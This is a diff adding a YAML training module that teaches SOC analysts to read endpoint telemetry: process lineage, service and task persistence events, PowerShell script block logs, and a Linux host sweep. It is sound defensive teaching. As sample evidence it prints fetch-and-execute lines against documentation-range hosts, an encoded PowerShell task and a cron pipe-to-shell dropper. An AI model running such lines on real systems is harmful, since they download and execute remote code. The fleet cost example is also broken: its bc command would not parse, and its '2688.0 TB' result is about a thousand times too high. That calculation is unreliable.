@@ -1,0 +1,362 @@
+apiVersion: openrange.io/v1
+kind: Module
+metadata:
+  slug: endpoint-telemetry-foundations
+  title: 'Endpoint telemetry: reading what hosts record'
+  version: 0.1.0
+  difficulty: medium
+  points: 150
+  estimated_minutes: 65
+  tags:
+    - soc
+    - endpoint
+    - telemetry
+    - edr
+    - auditd
+spec:
+  track: defense-cloud
+  summary: >-
+    Alerts tell you a rule fired; endpoint telemetry tells you what actually
+    ran. This module walks the event sources worth collecting, from process
+    creation records and their parent-child lineage to service installs,
+    task creations, registry autostarts, and PowerShell script block logs.
+    You learn what claim each source can honestly support, where coverage
+    collides with cost on a real fleet, and how to sweep a live host for
+    execution history using nothing but journalctl, ausearch, and grep.
+    The section closes by pointing you at the quiet-persistence room, which
+    plants exactly the artifact classes this module teaches you to find.
+  objectives:
+    - Explain which endpoint event sources exist and what claim each one supports.
+    - Reconstruct parent-child process lineage from process creation events and argue why lineage outranks single events.
+    - Identify service installs, scheduled task creations, and registry autostart writes as persistence telemetry.
+    - Describe what PowerShell script block logging captures that module logging misses.
+    - Weigh coverage against cost when choosing telemetry to collect across a fleet.
+    - Sweep a live Linux host for suspicious execution history with journalctl, ausearch, and grep.
+  sections:
+    - id: why-endpoints-record
+      title: 'Why endpoints record'
+      blocks:
+        - type: prose
+          markdown: |
+            Network sensors see conversations; endpoints see decisions. A flow
+            record can prove that your workstation talked to an unknown address
+            at 2 a.m., but only the host itself knows which process made the
+            call, under which user, launched by which parent, from a binary
+            dropped where. That difference decides investigations. Analysts who
+            read endpoint telemetry well spend their hours confirming stories;
+            analysts without it spend the same hours guessing.
+
+            The sources divide into a few families. Operating system audit
+            streams such as Windows Security events and Linux auditd records
+            come from the kernel's own accounting. Optional sensors such as
+            Sysmon on Windows or eBPF-based collectors on Linux add richer
+            context like hashes and full command lines. Endpoint detection and
+            response tools layer their own kernel instrumentation on top and
+            ship telemetry to a central console. Each family answers different
+            questions at a different price, and part of growing up as an
+            analyst is knowing which questions need which source.
+        - type: callout
+          tone: info
+          markdown: |
+            Telemetry is testimony, not truth. Every source has blind spots:
+            audit policies that were never enabled, log rotation that ate last
+            night, agents the attacker paused. Treat absence of evidence as a
+            finding about collection, never as proof nothing happened.
+    - id: process-lineage
+      title: 'Process lineage'
+      blocks:
+        - type: prose
+          markdown: |
+            The single most useful endpoint record is the process creation
+            event. On Windows, Security event 4688 fires for every new process
+            when process auditing is enabled, and Sysmon event 1 adds fields
+            auditors dream about: the full command line, the parent image, file
+            hashes, and the originating user. On Linux, auditd execve rules and
+            eBPF exec hooks capture equivalent facts if someone configured them
+            before the incident. One event is a data point. A chain of them,
+            connected through parent-child links, is a story about how code
+            came to run.
+
+            Lineage matters because attackers dress processes in familiar
+            clothing. cmd.exe spawning from Microsoft Word is suspicious even
+            though both binaries are signed and common, because office suites
+            have no honest reason to birth shells. A single event view shows
+            two normal programs; the tree view shows the lie immediately.
+        - type: code
+          language: text
+          code: |
+            Sysmon Event ID 1 (ProcessCreate)
+              UtcTime     : 2026-08-21 02:14:07.882
+              Image       : C:\Windows\System32\cmd.exe
+              CommandLine : cmd.exe /c quser & net group "Domain Admins" /domain
+              ParentImage : C:\Program Files\Vendor\reporting\svc.exe
+              User        : CORP\svc_reports
+              Hashes      : SHA256=9D8C41F2...
+
+            Read the pair, not the line. cmd.exe alone is boring. cmd.exe born
+            from a reporting service binary under a service account at 2 a.m.,
+            asking about domain admins, is a conversation the SOC should join.
+        - type: prose
+          markdown: |
+            Build one reflex now: whenever any alert lands, pull the process
+            tree around it before writing a word of analysis. Ask three things.
+            Who is the parent, and is that relationship normal? What else did
+            this process create or spawn within its first minute? Does the
+            command line match what the parent application legitimately does?
+            Most false positives die at step one, and the true positives get
+            dramatically easier to explain to whoever reads your notes next.
+        - type: quiz
+          question_id: etm-parent-child-proof
+          question: 'Sysmon shows powershell.exe whose ParentImage is winword.exe. Why does the lineage make this more interesting than the process name alone?'
+          options:
+            - id: a
+              text: 'PowerShell cannot legally start while Word runs.'
+            - id: b
+              text: 'The parent link suggests document-borne execution, since Office has no routine reason to spawn shells for users.'
+            - id: c
+              text: 'ParentImage fields are randomly generated by Sysmon.'
+            - id: d
+              text: 'It proves the attacker had administrator rights.'
+          answer_ids: [b]
+          explanation: >
+            Lineage encodes relationships that names cannot. Office documents
+            launching shells is the signature pattern of macro and exploit
+            lures, so the parent link converts two ordinary names into a strong
+            hypothesis about delivery.
+    - id: persistence-channels
+      title: 'Persistence channels'
+      blocks:
+        - type: prose
+          markdown: |
+            Anything that starts software without a human present is a
+            persistence channel, and every mainstream operating system keeps
+            several under management. On Windows the big three are services
+            (Security event 7045 records each install), scheduled tasks (event
+            4698 records creation), and registry autostart keys such as the
+            infamous Run keys, captured cleanly by Sysmon events 12 and 13. On
+            Linux the equivalents are cron entries, systemd units and timers,
+            shell initialization files, and SSH authorized_keys additions.
+            Attackers love these channels because reboot survival comes free;
+            defenders should love them because creation is loud when collected.
+
+            The teaching trick is to stop thinking of these as separate facts.
+            All of them answer one question: what code will run later even if
+            nobody touches anything? When you review a host, enumerate the
+            channel list first and only then judge each entry's innocence.
+        - type: code
+          language: text
+          code: |
+            Security 7045, Service Installed
+              Service Name  : WinRmSvcHelper
+              File Path     : C:\Windows\Temp\rmt_svc.exe   <- temp dir, not System32
+              Start Type    : auto start
+              Account       : LocalSystem
+
+            Security 4698, Scheduled Task Created
+              Task Name     : \Microsoft\Windows\Maintenance\HealthCheck
+              Command       : powershell.exe -enc SQBFAFgAIAAo...
+
+            Both borrow trusted names. The tells are location (Temp instead of
+            System32) and content (an encoded blob instead of arguments).
+        - type: prose
+          markdown: |
+            No single channel catches everything, which is why maturity models
+            score collectors on breadth. A service install missed by one agent
+            may still trip task telemetry, and a cron edit may surface only in
+            file integrity monitoring. This is also precisely the exercise the
+            scheduled-surprise and service-please rooms stage for you: they
+            hand you a box where something extra starts on schedule or at boot,
+            and your job is to name it, locate it, and explain how it got
+            there. Practice the sweep until it feels like checking your locks.
+        - type: quiz
+          question_id: etm-persistence-source
+          question: 'Which statement about persistence telemetry is defensible?'
+          options:
+            - id: a
+              text: 'Event 7045 alone proves no service-based persistence exists anywhere on the host.'
+            - id: b
+              text: 'Coverage must combine services, tasks, and autostart locations because each channel reports only itself.'
+            - id: c
+              text: 'Linux hosts have no persistence mechanisms worth auditing.'
+            - id: d
+              text: 'Registry Run keys stopped being used after 2015.'
+          answer_ids: [b]
+          explanation: >
+            Persistence channels are independent: installing a service says
+            nothing about cron, and vice versa. Defensible claims come from
+            enumerating every channel your platform supports, then reasoning
+            over the combined picture.
+    - id: script-block-logging
+      title: 'Script block logging'
+      blocks:
+        - type: prose
+          markdown: |
+            PowerShell earned its reputation inside intrusions, so Microsoft
+            built graduated logging to catch it. Module logging (event 4103)
+            records pipeline execution details. Transcripting captures console
+            sessions verbatim. The prize is script block logging, event 4104,
+            which records script content at compilation time, after decoding.
+            That timing detail changes everything: an encoded command, a
+            script fetched from the internet, a payload obfuscated through ten
+            layers, all arrive at the compiler as readable text, and 4104
+            photographs that text.
+
+            Command line auditing shows you powershell.exe -enc followed by
+            base64 soup, which proves little. Script block logging shows you
+            what the soup decoded into, including variables resolved and
+            loops expanded. For incident response on Windows fleets, 4104 is
+            routinely the single highest-value source, and enabling it costs
+            a group policy setting rather than a procurement cycle.
+        - type: code
+          language: text
+          code: |
+            PowerShell Operational, Event ID 4104 (Script Block)
+              Path          :                 <- blank: arrived over the wire
+              MessageTotal  : 1
+              MessageNumber : 1
+              Message       : Invoke-WebRequest http://203.0.113.9/ps/i.ps1 |
+                              IEX
+              ScriptBlockId : 8f2c41aa-3b7e-4c19-9d55-a6f0c2e91b33
+
+            The blank Path plus remote URL combination is itself a finding:
+            code with no home on disk executed anyway.
+        - type: prose
+          markdown: |
+            Expect volume complaints when you propose 4104. Busy automation
+            estates generate genuine noise from deployment frameworks, so pair
+            enablement with a suppression review after thirty days rather than
+            arguing forever beforehand. The goal is not capturing every
+            legitimate script ever run; it is guaranteeing that when something
+            ugly executes, a faithful copy of it already sits in your logs.
+        - type: quiz
+          question_id: etm-script-block-value
+          question: 'What does script block logging capture that command line auditing typically misses?'
+          options:
+            - id: a
+              text: 'The decrypted content of encoded and downloaded scripts, recorded at compile time.'
+            - id: b
+              text: 'The passwords typed into interactive prompts.'
+            - id: c
+              text: 'Network packet contents for PowerShell web requests.'
+            - id: d
+              text: 'Registry writes performed by any scripting engine.'
+          answer_ids: [a]
+          explanation: >
+            Event 4104 records script text after decoding and expansion,
+            exactly the transformation that makes -enc payloads and downloaded
+            files readable. It complements command line auditing rather than
+            duplicating it.
+    - id: coverage-versus-cost
+      title: 'Coverage versus cost'
+      blocks:
+        - type: prose
+          markdown: |
+            Collecting everything everywhere loses to arithmetic. Telemetry
+            volume drives storage bills, indexing latency, and the analyst
+            minutes spent scrolling past noise, while each additional agent
+            adds its own failure modes and update burden. Professional teams
+            therefore decide deliberately: crown-jewel hosts get deep
+            instrumentation with Sysmon profiles or full EDR sensors, broad
+            populations get curated native event sets, and anything between
+            gets justified in writing rather than inherited from a default.
+
+            Retention belongs in the same conversation. Holding thirty days
+            of everything hot costs multiples of holding a year of
+            security-relevant events warm, so tiering decisions deserve a
+            seat in security planning rather than living in storage admin
+            defaults nobody revisits.
+
+            Do the arithmetic before the argument. Estimate events per host
+            per day per source, multiply by fleet size and retention days,
+            and compare totals against budget with numbers attached. The same
+            math kills vanity projects early and funds the ones that matter.
+        - type: code
+          language: bash
+          code: |
+            $ du -sh /var/log/auth.log.1 /var/log/syslog.1
+            18M  /var/log/auth.log.1
+            29M  /var/log/syslog.1
+
+            # rough monthly fleet cost at default retention
+            $ echo "2000 * (18 + 29) MB * 30 days" | bc -l | awk '{printf "%.1f TB\n", $1/1048576}'
+            2688.0 TB
+
+            Wait: that assumes raw retention of everything. Curating sources
+            first (drop debug lines, keep auth and exec) shrinks the figure
+            by an order of magnitude before any tool negotiation begins.
+        - type: callout
+          tone: tip
+          markdown: |
+            When forced to choose, instrument identity boundaries first:
+            domain controllers, jump hosts, build servers, admin workstations.
+            Attacks cross those machines regardless of where they started.
+    - id: host-sweep-lab
+      title: 'Host sweep lab'
+      blocks:
+        - type: prose
+          markdown: |
+            Reading about telemetry builds vocabulary; sweeping a live box
+            builds instinct. The drill below uses stock tooling on a typical
+            Linux host, no agents required. Your goal is answering four
+            questions in order. What executed recently? What is scheduled to
+            execute? What runs at boot? What touched authentication state?
+            Each question maps to one command family, and together they cover
+            most quick-look triage an analyst performs in the first fifteen
+            minutes of any host investigation.
+        - type: code
+          language: bash
+          code: |
+            # what did cron actually run overnight?
+            $ journalctl --since "2026-08-20 00:00" --until "2026-08-21 00:00" \
+                _COMM=cron --no-pager | grep CMD | head -3
+            Aug 20 03:14:01 lab CRON[4411]: (root) CMD (/usr/local/bin/update-check)
+            Aug 20 04:14:01 lab CRON[4522]: (root) CMD (/usr/local/bin/update-check)
+            Aug 20 05:14:01 lab CRON[4630]: (root) CMD (/usr/local/bin/update-check)
+
+            # what executed via the audit subsystem this morning?
+            $ sudo ausearch --start today -sc execve 2>/dev/null | grep proctitle | head -2
+            proctitle=2F7573722F6C6F63616C2F62696E2F7570646174652D636865636B
+            proctitle=2F7573722F62696E2F6375726C
+
+            # what do startup scripts reach out to?
+            $ grep -RnE "curl|wget|nc " /etc/profile.d/ /etc/cron.d/ ~/.bashrc 2>/dev/null
+            /etc/cron.d/storage-sweeper:17 3 * * * root curl -fsSL http://203.0.113.66/x.sh | sh
+        - type: prose
+          markdown: |
+            The third command found a pipe-to-shell dropper hiding in a
+            plausible-looking file name, which is exactly the class of
+            artifact waiting in the quiet-persistence room along with three
+            siblings. Run the sweep there, decode any hex proctitle values
+            with xxd -r -p, and write down for each finding the channel it
+            abused and the earliest timestamp proving when it appeared. Those
+            notes become the spine of the incident timeline skill later in
+            this path, and the habit transfers unchanged to real estates.
+        - type: callout
+          tone: warning
+          markdown: |
+            Never "test" a suspicious command by running it to see what
+            happens, even in a lab you own. Analysis happens on copies and
+            through reading; execution belongs to detonation environments.
+  cheat_sheet: |
+    # Endpoint telemetry quick reference
+
+    Windows event cheat rows:
+        4688  process created (audit policy dependent)
+        4698  scheduled task created
+        7045  service installed
+        4104  PowerShell script block (decoded content)
+        Sysmon 1  process w/ hash + parent image
+        Sysmon 12/13  registry autostart set/add
+
+    Linux sweep kit:
+        journalctl _COMM=cron --since ... | grep CMD
+        sudo ausearch --start today -sc execve
+        grep -RnE "curl|wget|nc " /etc/profile.d/ /etc/cron.d/ ~/.bashrc
+        systemctl list-unit-files --state=enabled
+        ls -la ~/.ssh/authorized_keys
+
+    Analysis reflexes:
+        always pull parent-child trees before judging one event
+        persistence = enumerate every channel, then evaluate entries
+        estimate volume x fleet x retention before promising collection
+        absence of evidence means check collection, not celebrate
